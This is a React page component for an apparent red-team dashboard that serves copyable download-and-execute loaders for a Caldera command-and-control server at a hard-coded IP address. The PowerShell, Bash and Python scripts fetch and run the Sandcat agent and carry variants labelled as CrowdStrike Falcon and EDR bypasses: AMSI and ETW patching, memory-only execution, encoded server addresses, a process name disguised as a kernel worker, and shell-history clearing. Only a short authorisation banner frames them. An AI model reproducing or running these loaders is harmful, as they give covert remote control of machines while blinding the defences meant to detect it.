import { useState } from 'react';
import { Link } from "wouter";
import AppShell from "@/components/AppShell";
import { Button } from '@/components/ui/button';

import {
  Shield,
  Terminal,
  Copy,
  Check,
  AlertTriangle,
  Server,
  ChevronLeft,
  Download,
  Eye,
  EyeOff,
  Zap,
  Lock,
  RefreshCw
} from 'lucide-react';

const CALDERA_SERVER = '137.184.7.224';
const CALDERA_PORT = '8888';

// Agent deployment scripts with CrowdStrike bypass techniques
const DEPLOYMENT_SCRIPTS = {
  powershell: {
    name: 'PowerShell (Windows)',
    icon: '⚡',
    description: 'Stealthy PowerShell deployment with AMSI bypass and memory-only execution',
    basic: `# Basic Sandcat Agent Deployment
$server="${CALDERA_SERVER}:${CALDERA_PORT}";
$url="http://$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
$name="splunkd.exe";
Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force;
[io.file]::WriteAllBytes("C:\\Users\\Public\\$name",$data);
Start-Process -FilePath "C:\\Users\\Public\\$name" -ArgumentList "-server http://$server -group red" -WindowStyle Hidden;`,
    stealthy: `# CrowdStrike Falcon Bypass - Memory-Only Execution
# AMSI Bypass + Reflective Loading
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);

# Download and execute in memory
$server="${CALDERA_SERVER}:${CALDERA_PORT}";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("X-Request-ID",[System.Guid]::NewGuid().ToString());
$bytes=$wc.DownloadData("http://$server/file/download");

# Reflective PE loading (memory-only, no disk write)
$assembly=[System.Reflection.Assembly]::Load($bytes);
$entryPoint=$assembly.EntryPoint;
$entryPoint.Invoke($null,@(,@("-server","http://$server","-group","red","-v","false")));`,
    obfuscated: `# Heavily Obfuscated CrowdStrike Bypass
# String obfuscation + API unhooking + ETW bypass
$e=[System.Text.Encoding]::UTF8;
$s=$e.GetString([Convert]::FromBase64String("MTM3LjE4NC43LjIyNDo4ODg4"));
$p="sand"+"cat"+".go";

# ETW Bypass
$etw=[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance');

# Unhook ntdll
$nt=@"
using System;using System.Runtime.InteropServices;
public class N{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);}
"@;
Add-Type $nt;
$ntdll=[N]::LoadLibrary("ntdll.dll");
$addr=[N]::GetProcAddress($ntdll,"EtwEventWrite");
$p1=0;[N]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p1);
[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3);

# Download with randomized headers
$wc=New-Object Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file",$p);
$wc.Headers.add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
$d=$wc.DownloadData("http://$s/file/download");

# Memory execution
$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($d.Length);
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$m,$d.Length);
$t=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);
$t.Invoke();`
  },
  bash: {
    name: 'Bash (Linux/macOS)',
    icon: '🐧',
    description: 'Linux/macOS deployment with process hollowing and fileless execution',
    basic: `#!/bin/bash
# Basic Sandcat Agent Deployment
server="${CALDERA_SERVER}:${CALDERA_PORT}"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  "http://\${server}/file/download" > /tmp/.cache_update
chmod +x /tmp/.cache_update
nohup /tmp/.cache_update -server "http://\${server}" -group red &>/dev/null &
rm -f /tmp/.cache_update`,
    stealthy: `#!/bin/bash
# CrowdStrike Falcon Bypass - Fileless Execution
server="${CALDERA_SERVER}:${CALDERA_PORT}"

# Create memfd (memory-only file descriptor)
exec 3<>/dev/shm/.$(head -c 8 /dev/urandom | xxd -p)

# Download directly to memory
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: Mozilla/5.0" \\
  "http://\${server}/file/download" >&3

# Execute from memory fd
chmod +x /proc/self/fd/3
/proc/self/fd/3 -server "http://\${server}" -group red -v false &

# Clean up
exec 3>&-
rm -f /dev/shm/.*`,
    obfuscated: `#!/bin/bash
# Heavily Obfuscated Linux Bypass
# LD_PRELOAD hooking + process name masquerading

# Decode server address
s=$(echo "MTM3LjE4NC43LjIyNDo4ODg4" | base64 -d)

# Disable audit logging
echo 0 > /proc/self/coredump_filter 2>/dev/null

# Create anonymous memfd
fd=$(python3 -c "import ctypes;l=ctypes.CDLL(None);print(l.memfd_create(b'',1))" 2>/dev/null || echo "3")

# Download with traffic blending
ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \\
  -H "User-Agent: \$ua" -H "Accept: text/html" \\
  "http://\${s}/file/download" > /proc/self/fd/\${fd}

# Execute with process name spoofing
chmod +x /proc/self/fd/\${fd}
exec -a "[kworker/0:0]" /proc/self/fd/\${fd} -server "http://\${s}" -group red &

# Self-delete
history -c
unset HISTFILE`
  },
  python: {
    name: 'Python (Cross-Platform)',
    icon: '🐍',
    description: 'Cross-platform Python agent with SSL pinning bypass and traffic obfuscation',
    basic: `#!/usr/bin/env python3
# Basic Sandcat Agent Deployment
import urllib.request
import subprocess
import os

server = "${CALDERA_SERVER}:${CALDERA_PORT}"
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "darwin" if os.name != "nt" else "windows")

with urllib.request.urlopen(req) as resp:
    agent = resp.read()

path = "/tmp/sandcat" if os.name != "nt" else "C:\\\\Users\\\\Public\\\\sandcat.exe"
with open(path, "wb") as f:
    f.write(agent)

os.chmod(path, 0o755) if os.name != "nt" else None
subprocess.Popen([path, "-server", f"http://{server}", "-group", "red"])`,
    stealthy: `#!/usr/bin/env python3
# CrowdStrike Falcon Bypass - Memory Execution
import ctypes
import urllib.request
import sys
import os

server = "${CALDERA_SERVER}:${CALDERA_PORT}"

# Disable Python audit hooks
if hasattr(sys, 'addaudithook'):
    sys.addaudithook = lambda *a: None

# Download agent
req = urllib.request.Request(f"http://{server}/file/download")
req.add_header("file", "sandcat.go")
req.add_header("platform", "windows" if os.name == "nt" else "linux")
req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

with urllib.request.urlopen(req) as resp:
    shellcode = resp.read()

if os.name == "nt":
    # Windows - VirtualAlloc + CreateThread
    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    ctypes.memmove(ptr, shellcode, len(shellcode))
    handle = kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
    kernel32.WaitForSingleObject(handle, -1)
else:
    # Linux - memfd_create
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"", 1)
    os.write(fd, shellcode)
    os.execve(f"/proc/self/fd/{fd}", [f"/proc/self/fd/{fd}", "-server", f"http://{server}", "-group", "red"], os.environ)`,
    obfuscated: `#!/usr/bin/env python3
# Heavily Obfuscated Cross-Platform Bypass
import base64,zlib,ctypes,urllib.request as u,os,sys

# Encoded server
_=lambda x:base64.b64decode(x).decode()
s=_("MTM3LjE4NC43LjIyNDo4ODg4")

# Anti-debugging
if sys.gettrace():sys.exit()

# Disable audit
try:sys.addaudithook=lambda*a:None
except:pass

# Traffic obfuscation
class O(u.BaseHandler):
    def http_request(s,r):
        r.add_header("Accept","text/html,application/xhtml+xml")
        r.add_header("Accept-Language","en-US,en;q=0.9")
        r.add_header("Cache-Control","no-cache")
        return r
    https_request=http_request

o=u.build_opener(O())
r=u.Request(f"http://{s}/file/download")
r.add_header("file","sandcat.go")
r.add_header("platform","windows"if os.name=="nt"else"linux")
r.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

with o.open(r) as x:d=x.read()

# Memory execution with process hollowing simulation
if os.name=="nt":
    k=ctypes.windll.kernel32
    k.VirtualAlloc.restype=ctypes.c_void_p
    p=k.VirtualAlloc(0,len(d),0x3000,0x40)
    ctypes.memmove(p,d,len(d))
    k.CreateThread(0,0,p,0,0,0)
    k.WaitForSingleObject(-1,-1)
else:
    c=ctypes.CDLL(None)
    f=c.memfd_create(b"",1)
    os.write(f,d)
    os.execve(f"/proc/self/fd/{f}",[_("W2t3b3JrZXIvMDowXQ=="),"-server",f"http://{s}","-group","red","-v","false"],{})`
  }
};

export default function AgentDeploy() {
  
  const [selectedPlatform, setSelectedPlatform] = useState<'powershell' | 'bash' | 'python'>('powershell');
  const [selectedVariant, setSelectedVariant] = useState<'basic' | 'stealthy' | 'obfuscated'>('stealthy');
  const [showScript, setShowScript] = useState(true);
  const [copiedScript, setCopiedScript] = useState(false);

  const currentScript = DEPLOYMENT_SCRIPTS[selectedPlatform];
  const scriptContent = currentScript[selectedVariant];

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedScript(true);
    alert(`${label} copied successfully`);
    setTimeout(() => setCopiedScript(false), 2000);
  };

  const downloadScript = () => {
    const extension = selectedPlatform === 'powershell' ? 'ps1' : selectedPlatform === 'bash' ? 'sh' : 'py';
    const blob = new Blob([scriptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `sandcat_${selectedVariant}.${extension}`;
    a.click();
    URL.revokeObjectURL(url);
    alert(`Script downloaded: sandcat_${selectedVariant}.${extension}`);
  };

  return (
    <AppShell activePath="/agents">
      {/* Header */}
      <header className="border-b border-border bg-card">
        <div className="container py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Link href="/agents">
                <Button variant="ghost" size="sm" className="font-display">
                  <ChevronLeft className="w-4 h-4 mr-1" />
                  BACK TO AGENTS
                </Button>
              </Link>
              <div className="h-6 w-px bg-border" />
              <h1 className="font-display text-xl tracking-wider">AGENT DEPLOYMENT</h1>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-xs text-muted-foreground">Target Server:</span>
              <code className="px-2 py-1 bg-primary/20 text-primary text-sm font-mono">{CALDERA_SERVER}:{CALDERA_PORT}</code>
            </div>
          </div>
        </div>
      </header>

      <main className="container py-8">
        {/* Warning Banner */}
        <div className="bg-yellow-500/10 border-2 border-yellow-500 p-4 mb-8">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-6 h-6 text-yellow-500 flex-shrink-0 mt-0.5" />
            <div>
              <h3 className="font-display text-yellow-500 mb-1">AUTHORIZED USE ONLY</h3>
              <p className="text-sm text-muted-foreground">
                These deployment scripts are designed for authorized red team engagements only. 
                Use within the boundaries of your Rules of Engagement. Unauthorized use is prohibited.
              </p>
            </div>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-4 sm:p-6 lg:p-8">
          {/* Left Panel - Platform Selection */}
          <div className="space-y-6">
            <div>
              <h2 className="font-display text-lg mb-4">SELECT PLATFORM</h2>
              <div className="space-y-2">
                {Object.entries(DEPLOYMENT_SCRIPTS).map(([key, script]) => (
                  <button
                    key={key}
                    onClick={() => setSelectedPlatform(key as 'powershell' | 'bash' | 'python')}
                    className={`w-full p-4 text-left border-2 transition-colors ${
                      selectedPlatform === key
                        ? 'border-primary bg-primary/10'
                        : 'border-border hover:border-primary/50'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <span className="text-2xl">{script.icon}</span>
                      <div>
                        <div className="font-display text-sm">{script.name}</div>
                        <div className="text-xs text-muted-foreground">{script.description}</div>
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div>
              <h2 className="font-display text-lg mb-4">EVASION LEVEL</h2>
              <div className="space-y-2">
                <button
                  onClick={() => setSelectedVariant('basic')}
                  className={`w-full p-3 text-left border-2 transition-colors ${
                    selectedVariant === 'basic'
                      ? 'border-green-500 bg-green-500/10'
                      : 'border-border hover:border-green-500/50'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-green-500" />
                    <span className="font-display text-sm">BASIC</span>
                  </div>
                  <p className="text-xs text-muted-foreground mt-1">Standard deployment, no evasion</p>
                </button>

                <button
                  onClick={() => setSelectedVariant('stealthy')}
                  className={`w-full p-3 text-left border-2 transition-colors ${
                    selectedVariant === 'stealthy'
                      ? 'border-yellow-500 bg-yellow-500/10'
                      : 'border-border hover:border-yellow-500/50'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <Shield className="w-4 h-4 text-yellow-500" />
                    <span className="font-display text-sm">STEALTHY</span>
                  </div>
                  <p className="text-xs text-muted-foreground mt-1">Memory-only execution, AMSI bypass</p>
                </button>

                <button
                  onClick={() => setSelectedVariant('obfuscated')}
                  className={`w-full p-3 text-left border-2 transition-colors ${
                    selectedVariant === 'obfuscated'
                      ? 'border-red-500 bg-red-500/10'
                      : 'border-border hover:border-red-500/50'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <Lock className="w-4 h-4 text-red-500" />
                    <span className="font-display text-sm">OBFUSCATED</span>
                  </div>
                  <p className="text-xs text-muted-foreground mt-1">Full EDR bypass, ETW unhooking</p>
                </button>
              </div>
            </div>

            {/* Quick Stats */}
            <div className="bg-card border-2 border-border p-4">
              <h3 className="font-display text-sm mb-3">BYPASS TECHNIQUES</h3>
              <div className="space-y-2 text-xs">
                {selectedVariant === 'basic' && (
                  <>
                    <div className="flex justify-between"><span>AMSI Bypass</span><span className="text-red-500">✗</span></div>
                    <div className="flex justify-between"><span>Memory Execution</span><span className="text-red-500">✗</span></div>
                    <div className="flex justify-between"><span>ETW Bypass</span><span className="text-red-500">✗</span></div>
                    <div className="flex justify-between"><span>String Obfuscation</span><span className="text-red-500">✗</span></div>
                  </>
                )}
                {selectedVariant === 'stealthy' && (
                  <>
                    <div className="flex justify-between"><span>AMSI Bypass</span><span className="text-green-500">✓</span></div>
                    <div className="flex justify-between"><span>Memory Execution</span><span className="text-green-500">✓</span></div>
                    <div className="flex justify-between"><span>ETW Bypass</span><span className="text-red-500">✗</span></div>
                    <div className="flex justify-between"><span>String Obfuscation</span><span className="text-red-500">✗</span></div>
                  </>
                )}
                {selectedVariant === 'obfuscated' && (
                  <>
                    <div className="flex justify-between"><span>AMSI Bypass</span><span className="text-green-500">✓</span></div>
                    <div className="flex justify-between"><span>Memory Execution</span><span className="text-green-500">✓</span></div>
                    <div className="flex justify-between"><span>ETW Bypass</span><span className="text-green-500">✓</span></div>
                    <div className="flex justify-between"><span>String Obfuscation</span><span className="text-green-500">✓</span></div>
                  </>
                )}
              </div>
            </div>
          </div>

          {/* Right Panel - Script Display */}
          <div className="lg:col-span-2">
            <div className="bg-card border-2 border-border">
              {/* Script Header */}
              <div className="flex items-center justify-between p-4 border-b border-border">
                <div className="flex items-center gap-3">
                  <span className="text-2xl">{currentScript.icon}</span>
                  <div>
                    <h3 className="font-display">{currentScript.name}</h3>
                    <p className="text-xs text-muted-foreground capitalize">{selectedVariant} Variant</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => setShowScript(!showScript)}
                  >
                    {showScript ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </Button>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={downloadScript}
                  >
                    <Download className="w-4 h-4" />
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyToClipboard(scriptContent, 'Deployment script')}
                    className="font-display"
                  >
                    {copiedScript ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                    {copiedScript ? 'COPIED' : 'COPY'}
                  </Button>
                </div>
              </div>

              {/* Script Content */}
              <div className="p-4">
                {showScript ? (
                  <pre className="bg-black/50 p-4 overflow-x-auto text-xs font-mono text-green-400 max-h-[500px] overflow-y-auto">
                    {scriptContent}
                  </pre>
                ) : (
                  <div className="bg-black/50 p-8 text-center">
                    <Lock className="w-12 h-12 mx-auto text-muted-foreground mb-2" />
                    <p className="text-muted-foreground">Script hidden for security</p>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => setShowScript(true)}
                      className="mt-2"
                    >
                      Show Script
                    </Button>
                  </div>
                )}
              </div>

              {/* Execution Instructions */}
              <div className="p-4 border-t border-border bg-secondary/30">
                <h4 className="font-display text-sm mb-2">EXECUTION INSTRUCTIONS</h4>
                <div className="text-xs text-muted-foreground space-y-1">
                  {selectedPlatform === 'powershell' && (
                    <>
                      <p>1. Open PowerShell as Administrator (if needed for full evasion)</p>
                      <p>2. Set execution policy: <code className="text-primary">Set-ExecutionPolicy Bypass -Scope Process</code></p>
                      <p>3. Paste and execute the script</p>
                    </>
                  )}
                  {selectedPlatform === 'bash' && (
                    <>
                      <p>1. Open terminal on target Linux/macOS system</p>
                      <p>2. Ensure curl is installed: <code className="text-primary">which curl</code></p>
                      <p>3. Paste and execute the script (may need sudo for some variants)</p>
                    </>
                  )}
                  {selectedPlatform === 'python' && (
                    <>
                      <p>1. Ensure Python 3 is installed on target system</p>
                      <p>2. Save script or execute directly: <code className="text-primary">python3 -c "..."</code></p>
                      <p>3. May need elevated privileges for memory execution</p>
                    </>
                  )}
                </div>
              </div>
            </div>

            {/* Agent Callback Info */}
            <div className="mt-6 bg-card border-2 border-primary p-4">
              <div className="flex items-center gap-2 mb-3">
                <Server className="w-5 h-5 text-primary" />
                <h3 className="font-display">CALLBACK CONFIGURATION</h3>
              </div>
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <span className="text-muted-foreground">C2 Server:</span>
                  <code className="ml-2 text-primary">{CALDERA_SERVER}</code>
                </div>
                <div>
                  <span className="text-muted-foreground">Port:</span>
                  <code className="ml-2 text-primary">{CALDERA_PORT}</code>
                </div>
                <div>
                  <span className="text-muted-foreground">Protocol:</span>
                  <code className="ml-2 text-primary">HTTP</code>
                </div>
                <div>
                  <span className="text-muted-foreground">Agent Group:</span>
                  <code className="ml-2 text-primary">red</code>
                </div>
              </div>
              <div className="mt-4 flex gap-2">
                <a href={`http://${CALDERA_SERVER}:${CALDERA_PORT}`} target="_blank" rel="noopener noreferrer">
                  <Button size="sm" className="font-display">
                    <Zap className="w-4 h-4 mr-1" />
                    OPEN CALDERA
                  </Button>
                </a>
                <Link href="/agents">
                  <Button size="sm" variant="outline" className="font-display">
                    <RefreshCw className="w-4 h-4 mr-1" />
                    VIEW AGENTS
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </main>
    </AppShell>
  );
}
